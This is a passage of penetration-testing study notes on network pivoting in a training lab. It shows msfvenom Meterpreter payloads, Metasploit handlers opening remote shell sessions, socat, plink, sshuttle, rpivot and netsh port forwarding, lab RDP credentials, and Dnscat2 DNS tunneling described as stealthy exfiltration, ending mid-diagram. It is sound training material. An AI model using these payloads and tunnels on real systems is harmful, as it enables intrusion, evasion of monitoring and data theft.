**`kali@kali:~$`**

</td>
<td>

```bash
scp shell.elf ubuntu@10.129.202.64:/home/ubuntu/
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
# [-]
```

</td>
</tr>
</table>

**Starting MSF Console**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo msfconsole
```

</td>
</tr>
</table>

**Configuring & Starting the multi/handler**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
use exploit/multi/handler
# [*] Using configured payload generic/shell_reverse_tcp
set payload windows/x64/meterpreter/reverse_https
# payload => windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
# lhost => 0.0.0.0
set lport 80
# lport => 80
run
# [*] Started HTTPS reverse handler on https://0.0.0.0:80
```

</td>
</tr>
</table>

We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.

**Establishing the Meterpreter Session**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td width="20%">

**`meterpreter >`**

</td>
<td>

```bash
# [!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
# [*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
# [!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
# [*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 ) at 2022-03-07 11:08:10 -0500

meterpreter > getuid
# Server username: INLANEFREIGHT\victor
```

</td>
</tr>
</table>

</details>

<details>
<summary><h2>Socat redirection with a Bind Shell</h2></summary>

A socat bind shell redirector can be created similarly to a reverse shell redirector. This differs from reverse shells, which connect from the Windows server to the Ubuntu server and get redirected to the attack host. For bind shells, the Windows server starts a listener and binds to a specific port. A socat redirector can be created on the Ubuntu server to listen for incoming connections from a Metasploit bind handler and forward them to the bind shell payload on the Windows target.

```mermaid
flowchart LR
    %% Nodes
    A["<b>🔴 Attack Host</b><br/>10.10.15.5"]
    M["<b>Metasploit Handler</b>"]
    S["<b>Socat</b><br/>Listen: 8080<br/>Forward 172.16.5.19:8443"]
    V1["<b>🖥️ Victim Server (Ubuntu)</b><br/>10.129.15.50<br/>172.16.5.129"]
    BS["<b>📁 Bind Shell</b><br/>Listen: 8443"]
    V2["<b>🖥️ Victim Server (Windows A)</b><br/>172.16.5.19<br/>RDP Service"]

    %% Connections
    A -->|"<b>Stage Request</b>"| M
    M -.->|"<b>Stage Request</b>"| S
    S -.->|"<b>Forward</b>"| V1
    V1 -.->|"<b>Response</b>"| BS
    BS -.->|"<b>Response</b>"| V2

    %% Styling
    style A fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
    style M fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
    style S fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
    style V1 fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
    style BS fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
    style V2 fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff

    %% Link styling
    linkStyle 0 stroke:#ff6b6b,stroke-width:3px
    linkStyle 1 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
    linkStyle 2 stroke:#6c8ebf,stroke-width:3px,stroke-dasharray:5
    linkStyle 3 stroke:#90EE90,stroke-width:3px,stroke-dasharray:5
    linkStyle 4 stroke:#9b87f5,stroke-width:3px,stroke-dasharray:5
```



**Creating the Windows Payload**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
# [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# [-] No arch selected, selecting arch: x64 from the payload
# No encoder specified, outputting raw payload
# Payload size: 499 bytes
# Final size of exe file: 7168 bytes
# Saved as: backupjob.exe
```

</td>
</tr>
</table>

We can start a socat bind shell listener, which listens on port 8080 and forwards packets to Windows server 8443.

**Starting Socat Bind Shell Listener in the Ubuntu Server**

<table width="100%">
<tr>
<td colspan="2"> 🚇 <b>bash — Ubuntu (Pivot)</b> </td>
</tr>
<tr>
<td width="20%">

**`ubuntu@pivot:~$`**

</td>
<td>

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

</td>
</tr>
</table>

Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)

**Configuring & Starting the Bind multi/handler**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo msfconsole
```

</td>
</tr>
</table>

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```bash
use exploit/multi/handler
# [*] Using configured payload generic/shell_reverse_tcp
set payload windows/x64/meterpreter/bind_tcp
# payload => windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
# RHOST => 10.129.202.64
set LPORT 8080
# LPORT => 8080
run
# [*] Started bind TCP handler against 10.129.202.64:8080
```

</td>
</tr>
</table>

We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.

**Establishing Meterpreter Session**

<table width="100%">
<tr>
<td> 💣 <b>Meterpreter</b> </td>
</tr>
<tr>
<td>

```
# [*] Sending stage (200262 bytes) to 10.129.202.64
# [*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500

meterpreter > getuid
# Server username: INLANEFREIGHT\victor
```

</td>
</tr>
</table>

</details>

</details>

---

<details>
<summary><h1>🏓 Pivoting Around Obstacles</h1></summary>

<details>
<summary><h2>SSH for Windows: plink.exe</h2></summary>

Plink (PuTTY Link) is a command-line SSH tool for Windows included with the PuTTY package.

It can perform:

- Dynamic port forwarding
- SOCKS proxy creation

> **NOTE:** Before Fall 2018, Windows did not ship with a native SSH client. PuTTY became the go-to tool for many system administrators who needed to connect to remote hosts.

<details>
<summary><h3>Scenario</h3></summary>

Imagine the following situation:

> We gain access → The host is Windows → The security posture is moderately locked down

You need to pivot through this machine, but:

- Pulling your own tools is risky
- Exposure is likely

If PuTTY is already installed —or if a copy exists on a file share— Plink becomes the pivoting solution, allowing you to operate longer without detection.

> **NOTE:** Plink is also useful when the primary attack host is Windows rather than Linux.

```mermaid
flowchart TB
    %% Nodes - Attack Host Section (Vertical)
    W["<b>💻 Windows Attack Host</b><br/>10.10.15.5"]
    M["<b>MSTSC.exe</b><br/>(RDP Client)"]
    PA["<b>Proxifier Agent</b>"]

    %% Nodes - Middle Section (Horizontal)
    subgraph TUNNEL[" "]
        direction LR
        SL["<b>SOCKS Listener</b><br/>Port: 9050"]
        PC["<b>Plink SSH Client</b>"]
        SSH["<b>SSH Tunnel</b><br/>0.0.0.0:22"]

        SL <-.->|"<b>Forward Packets</b>"| PC
        PC -.->|"<b>Port Forward<br/>8080 → 80</b>"| SSH
    end

    %% Nodes - Victim Section (Horizontal)
    subgraph VICTIMS[" "]
        direction LR
        U["<b>🖥️ Victim Server (Ubuntu)</b><br/>10.129.15.50<br/>172.16.5.129"]
        WV["<b>🖥️ Victim Server (Windows A)</b><br/>172.16.5.19<br/>RDP Service"]

        U ==>|"<b>Forward RDP</b>"| WV
    end

    %% Connections - Vertical Flow
    W --> M
    M -.->|"<b>Send Packets</b>"| PA
    PA -.->|"<b>Forward to SOCKS</b>"| SL

    %% Connections - Between Sections
    SSH ==>|"<b>Forward RDP traffic<br/>over Plink SSH</b>"| U

    %% Styling
    style W fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
    style M fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
    style PA fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
    style PC fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
    style SL fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
    style SSH fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
    style U fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
    style WV fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
    style TUNNEL fill:none,stroke:#6c8ebf,stroke-width:2px,stroke-dasharray:5
    style VICTIMS fill:none,stroke:#90EE90,stroke-width:2px,stroke-dasharray:5

    %% Link styling
    linkStyle 0 stroke:#6c8ebf,stroke-width:3px,stroke-dasharray:5
    linkStyle 1 stroke:#ff9500,stroke-width:3px,stroke-dasharray:5
    linkStyle 2 stroke:#90EE90,stroke-width:4px
    linkStyle 3 stroke:#ff6b6b,stroke-width:2px
    linkStyle 4 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
    linkStyle 5 stroke:#9b87f5,stroke-width:3px,stroke-dasharray:5
    linkStyle 6 stroke:#90EE90,stroke-width:4px
```



</details>

<details>
<summary><h3>1. Plink Usage</h3></summary>

The Windows attack host starts a plink.exe process to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.

**Using Plink.exe**

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows Attack Host</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\>`**

</td>
<td>

```cmd
plink -ssh -D 9050 ubuntu@10.129.15.50
```

</td>
</tr>
</table>

</details>

<details>
<summary><h3>2. Introducing Proxifier</h3></summary>

Proxifier is another Windows-based tool that can establish a SOCKS tunnel through the SSH session previously created.

It provides the ability to:

- Create a tunneled network path for desktop applications
- Route traffic through SOCKS or HTTPS proxies
- Perform proxy chaining

You can create a Proxifier profile that specifies:
| Setting | Value |
| ----------------- | -------------------- |
| SOCKS server host | `127.0.0.1` |
| SOCKS server port | `9050` |
| Source | Plink’s SOCKS tunnel |

</details>

<details>
<summary><h3>3. Starting an RDP Session Through the Tunnel</h3></summary>

Once the SOCKS server is configured (127.0.0.1:9050), you can directly launch:

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows Attack Host</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\>`**

</td>
<td>

```cmd
mstsc.exe
```

</td>
</tr>
</table>

This starts an RDP session with a Windows target that permits RDP connections, using the tunnel established through Proxifier.

</details>

</details>

<details>
<summary><h2>SSH Pivoting with Sshuttle</h2></summary>

**[Sshuttle](https://github.com/sshuttle/sshuttle)** is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. Sshuttle can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle using the example later in this section.

One interesting usage of _sshuttle_ is that we don't need to use _proxychains_ to connect to the remote hosts.

**Install sshuttle**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo apt-get install sshuttle
```

</td>
</tr>
</table>

To use _sshuttle_, we specify the option -r to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network `172.16.5.0/23`.

**Run sshuttle**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
# Starting sshuttle proxy (version 1.1.0).
# c : Starting firewall manager with command: ['/usr/bin/python3', '/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py', '-v', '--method', 'auto', '--firewall']
# fw: Starting firewall with Python version 3.9.2
# fw: ready method name nat.
# c : IPv6 enabled: Using default IPv6 listen address ::1
# c : Method: nat
# c : IPv4: on
# c : IPv6: on
# c : UDP : off (not available with nat method)
# c : DNS : off (available)
# c : User: off (available)
# c : Subnets to forward through remote host (type, IP, cidr mask width, startPort, endPort):
# c :   (<AddressFamily.AF_INET: 2>, '172.16.5.0', 32, 0, 0)
# c : Subnets to exclude from forwarding:
# c :   (<AddressFamily.AF_INET: 2>, '127.0.0.1', 32, 0, 0)
# c :   (<AddressFamily.AF_INET6: 10>, '::1', 128, 0, 0)
# c : TCP redirector listening on ('::1', 12300, 0, 0).
# c : TCP redirector listening on ('127.0.0.1', 12300).
# c : Starting client with Python version 3.9.2
# c : Connecting to server...
# ubuntu@10.129.202.64's password:
# s: Running server on remote host with /usr/bin/python3 (version 3.8.10)
# s: latency control setting = True
# s: auto-nets:False
# c : Connected to server.
# fw: setting up.
# fw: ip6tables -w -t nat -N sshuttle-12300
# fw: ip6tables -w -t nat -F sshuttle-12300
# fw: ip6tables -w -t nat -I OUTPUT 1 -j sshuttle-12300
# fw: ip6tables -w -t nat -I PREROUTING 1 -j sshuttle-12300
# fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
# fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN --dest ::1/128 -p tcp
# fw: iptables -w -t nat -N sshuttle-12300
# fw: iptables -w -t nat -F sshuttle-12300
# fw: iptables -w -t nat -I OUTPUT 1 -j sshuttle-12300
# fw: iptables -w -t nat -I PREROUTING 1 -j sshuttle-12300
# fw: iptables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
# fw: iptables -w -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp
# fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp --to-ports 12300
```

</td>
</tr>
</table>

With this command, _sshuttle_ creates an entry in our iptables to redirect all traffic to the `172.16.5.0/23` network through the pivot host.

**Traffic Routing through iptables Routes**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
# Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
# Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-01 12:54 CST
# NSE: Loaded 156 scripts for scanning.
# NSE: Script Pre-scanning.
# Initiating NSE at 12:54
# Completed NSE at 12:54, 0.00s elapsed
# Initiating NSE at 12:54
# Completed NSE at 12:54, 0.00s elapsed
# Initiating NSE at 12:54
# Completed NSE at 12:54, 0.00s elapsed
# Initiating Parallel DNS resolution of 1 host. at 12:54
# Completed Parallel DNS resolution of 1 host. at 12:54, 0.05s elapsed
# Initiating Connect Scan at 12:54
# Scanning 172.16.5.19 [1 port]
# Discovered open port 3389/tcp on 172.16.5.19
# Completed Connect Scan at 12:54, 0.00s elapsed (1 total ports)
# Initiating Service scan at 12:54
# Scanning 1 service on 172.16.5.19
# Completed Service scan at 12:54, 6.71s elapsed (1 service on 1 host)
# Initiating OS detection (try #1) against 172.16.5.19
# Retrying OS detection (try #2) against 172.16.5.19
# Initiating Traceroute at 12:54
# Completed Traceroute at 12:55, 9.08s elapsed
# Initiating Parallel DNS resolution of 1 host. at 12:55
# Completed Parallel DNS resolution of 1 host. at 12:55, 0.17s elapsed
# NSE: Script scanning 172.16.5.19.
# Initiating NSE at 12:55
# Completed NSE at 12:55, 5.02s elapsed
# Initiating NSE at 12:55
# Completed NSE at 12:55, 2.60s elapsed
# Initiating NSE at 12:55
# Completed NSE at 12:55, 0.00s elapsed
# Nmap scan report for 172.16.5.19
# Host is up (0.000093s latency).

# PORT     STATE SERVICE       VERSION
# 3389/tcp open  ms-wbt-server Microsoft Terminal Services
# | ssl-cert: Subject: commonName=DC01.inlanefreight.local
# | Issuer: commonName=DC01.inlanefreight.local
# | Public Key type: rsa
# | Public Key bits: 2048
# | Signature Algorithm: sha256WithRSAEncryption
# | Not valid before: 2025-11-30T18:52:36
# | Not valid after:  2026-06-01T18:52:36
# | MD5:   f9fa:15f2:b84c:3343:82bc:79bd:2e89:2629
# |_SHA-1: 5b34:3b52:9b67:4462:4c67:d373:23e5:d2d2:b96c:bf9d
# | rdp-ntlm-info:
# |   Target_Name: INLANEFREIGHT
# |   NetBIOS_Domain_Name: INLANEFREIGHT
# |   NetBIOS_Computer_Name: DC01
# |   DNS_Domain_Name: inlanefreight.local
# |   DNS_Computer_Name: DC01.inlanefreight.local
# |   Product_Version: 10.0.17763
# |_  System_Time: 2025-12-01T18:55:14+00:00
# |_ssl-date: 2025-12-01T18:55:18+00:00; +5s from scanner time.
# Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
# OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
# No OS matches for host
# Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

# Host script results:
# |_clock-skew: mean: 4s, deviation: 0s, median: 4s

# TRACEROUTE (using proto 1/icmp)
# HOP RTT     ADDRESS
# 1   0.10 ms 209.151.144.1
# 2   ... 30

# NSE: Script Post-scanning.
# Initiating NSE at 12:55
# Completed NSE at 12:55, 0.00s elapsed
# Initiating NSE at 12:55
# Completed NSE at 12:55, 0.00s elapsed
# Initiating NSE at 12:55
# Completed NSE at 12:55, 0.00s elapsed
# Read data files from: /usr/bin/../share/nmap
# OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done: 1 IP address (1 host up) scanned in 29.99 seconds
#            Raw packets sent: 236 (14.992KB) | Rcvd: 360 (24.634KB)
```

</td>
</tr>
</table>

We can now use any tool directly without using proxychains.

</details>

<details>
<summary><h2>Web Server Pivoting with Rpivot</h2></summary>

**[Rpivot](https://github.com/klsecservices/rpivot)** is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (`172.16.5.135`), and we want to access that using the rpivot proxy.

```mermaid
flowchart LR
    %% Nodes
    A["<b>🔴 Attack Host</b><br/>10.10.15.5"]
    EXT["<b>☁️ External Network</b><br/>10.129.110.0"]
    U["<b>🖥️ Victim Server (Ubuntu)</b><br/>10.129.15.50<br/>172.16.5.129<br/><i>Dual Homed</i>"]
    W["<b>🖥️ Victim Server (Webserver)</b><br/>172.16.5.135<br/>Webserver on Port 80"]
    INT["<b>🔒 Internal Network</b><br/>172.16.5.0"]

    %% Connections
    A -.->|"<b>Connect</b>"| EXT
    EXT -.->|"<b>Access</b>"| U
    U -.->|"<b>Pivot</b>"| INT
    INT -.->|"<b>Access</b>"| W

    %% Styling
    style A fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
    style EXT fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
    style U fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
    style W fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
    style INT fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff

    %% Link styling
    linkStyle 0 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
    linkStyle 1 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
    linkStyle 2 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
    linkStyle 3 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
```



**Cloning rpivot**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
git clone https://github.com/klsecservices/rpivot.git
```

</td>
</tr>
</table>

**Installation of Python2.7**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
```

</td>
</tr>
</table>

We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using server.py.

**Running server.py from the Attack Host**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

</td>
</tr>
</table>

**Setting SOCKS5**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo sed -i '/^socks/d' /etc/proxychains.conf && echo 'socks5 127.0.0.1 9050' | sudo tee -a /etc/proxychains.conf
```

</td>
</tr>
</table>

Before running client.py we will need to transfer rpivot folder to the target. We can do this using this SCP command:

**Transferring rpivot to the Target**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

</td>
</tr>
</table>

**Running client.py from Pivot Target**

<table width="100%">
<tr>
<td colspan="2"> 🚇 <b>bash — Ubuntu (Pivot)</b> </td>
</tr>
<tr>
<td width="20%">

**`ubuntu@pivot:~$`**

</td>
<td>

```bash
python2.7 client.py --server-ip 10.10.15.165 --server-port 9999
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
# Backconnecting to server 10.10.14.18 port 9999

# New connection from host 10.129.202.64, source port 35226
```

</td>
</tr>
</table>

We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.

Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.

**Browsing to the Target Webserver using Proxychains**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
proxychains firefox-esr 172.16.5.135:80
```

</td>
</tr>
</table>

Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:

**Connecting to a Web Server using HTTP-Proxy & NTLM Auth**

<table width="100%">
<tr>
<td colspan="2"> 🚇 <b>bash — Ubuntu (Pivot)</b> </td>
</tr>
<tr>
<td width="20%">

**`ubuntu@pivot:~$`**

</td>
<td>

```bash
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

</td>
</tr>
</table>

</details>

<details>
<summary><h2>Port Forwarding with Windows Netsh</h2></summary>

**[Netsh](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh)** is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use Netsh for:

- Finding routes
- Viewing the firewall configuration
- Adding proxies
- Creating port forwarding rules

Let's take an example of the below scenario where our compromised host is a Windows 10-based IT admin's workstation (`10.129.15.150`, `172.16.5.25`). Keep in mind that it is possible on an engagement that we may gain access to an employee's workstation through methods such as social engineering and phishing. This would allow us to pivot further from within the network the workstation is in.

```mermaid
flowchart LR
    %% Nodes
    A["<b>🔴 Attack Host</b><br/>10.10.15.5"]

    subgraph PIVOT[" "]
        direction TB
        L["<b>Listen on</b><br/>10.129.15.150:<span style='color:#FFD700'>8080</span>"]
        N["<b>Netsh.exe</b>"]
        F["<b>Forward to</b><br/>172.16.5.25:<span style='color:#FFD700'>3389</span>"]

        L -.->|" "| N
        N -.->|" "| F
    end

    subgraph VICTIMS[" "]
        direction LR
        W1["<b>🖥️ Windows10 User(pwn)</b><br/>10.129.15.150<br/>172.16.5.19"]
        W2["<b>🖥️ Windows Server</b><br/>172.16.5.25<br/>RDP Service"]
    end

    %% Connections
    A -.->|"<b>RDP Request</b>"| L
    F -.->|"<b>Forwards RDP<br/>Service Request</b>"| W1
    W1 -.->|"<b>RDP Connection</b>"| W2

    %% Styling
    style A fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
    style L fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
    style N fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
    style F fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
    style W1 fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
    style W2 fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
    style PIVOT fill:none,stroke:#6c8ebf,stroke-width:2px,stroke-dasharray:5
    style VICTIMS fill:none,stroke:#90EE90,stroke-width:2px,stroke-dasharray:5

    %% Link styling
    linkStyle 0 stroke:#FFD700,stroke-width:2px,stroke-dasharray:3
    linkStyle 1 stroke:#FFD700,stroke-width:2px,stroke-dasharray:3
    linkStyle 2 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
    linkStyle 3 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
    linkStyle 4 stroke:#90EE90,stroke-width:3px,stroke-dasharray:5
```



**Connect to the pivot machine**

<table width="100%">
<tr>
<td> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td>

```bash
xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
```

</td>
</tr>
</table>

We can use _netsh.exe_ to forward all data received on a specific port (say 8080) to a remote host on a remote port.

**Using Netsh.exe to Port Forward**

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows Pivot</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.5.19
```

</td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
netsh advfirewall firewall add rule name="PortForward 8080" dir=in action=allow protocol=TCP localport=8080
```

</td>
</tr>
</table>

**Verifying Port Forward**

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows Pivot</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
netsh interface portproxy show v4tov4
```

</td>
</tr>
<tr>
<td colspan="2">

---

```text
Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
0.0.0.0         8080        172.16.5.19     3389
```

</td>
</tr>
</table>

After configuring the portproxy on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
```

</td>
</tr>
</table>

</details>

</details>

---

<details>
<summary><h1>🌿 Branching Out Our Tunnels</h1></summary>

<details>
<summary><h2>DNS Tunneling with Dnscat2</h2></summary>

Dnscat2 is a tunneling tool designed to establish an encrypted Command and Control (C2) channel between two hosts (attacker server and victim client) using the fundamental DNS protocol.

**Evasion Mechanism:**

1. **Exploiting Allowed Traffic:** It capitalizes on the fact that DNS traffic (UDP port 53) is essential and is nearly always permitted through corporate firewalls and Intrusion Prevention Systems (IPS).

2. **Encapsulated Exfiltration:** Instead of sending legitimate resolution requests, Dnscat2 encapsulates data (commands and stolen information) within the fields of DNS records, typically using TXT records.

3. **Surreptitious Operation:** When the victim machine attempts to _"resolve"_ a malicious domain, the query is directed through the internal DNS server, bypasses the corporate firewall, and eventually reaches the attacker's Dnscat2 server (C2). This achieves data exfiltration stealthily, evading detection based on inspection of web protocols like HTTPS/HTTP.

In essence, Dnscat2 transforms an essential, low-inspection network protocol (DNS) into a secret communication channel.

```mermaid
flowchart LR
    %% Node Definitions
    subgraph ATT["**Attack Host (C&C Server)**<br/>10.10.15.5"]
        direction TB
        DNSCAT_S["**Dnscat2 Server**<br/>(🎧 Listener)"]
    end

    subgraph CORP["**Corporate Network (Victim)** 🏢"]
        direction TB
        WIN_C["**Windows Host**<br/>(💻 Victim Client)"]
        DNS_I["**Internal DNS Server** 📜"]
        FIREWALL["**Firewall / IPS**<br/>(🛡️ Inspects HTTPS/HTTP)"]
    end

    DNS_E["**External DNS Resolver**<br/>(🌎 e.g., 8.8.8.8)"]

    %% Connection and Exfiltration Flow

    %% 1. The client initiates a malicious 'DNS resolution' via its internal DNS server (not a legitimate query)
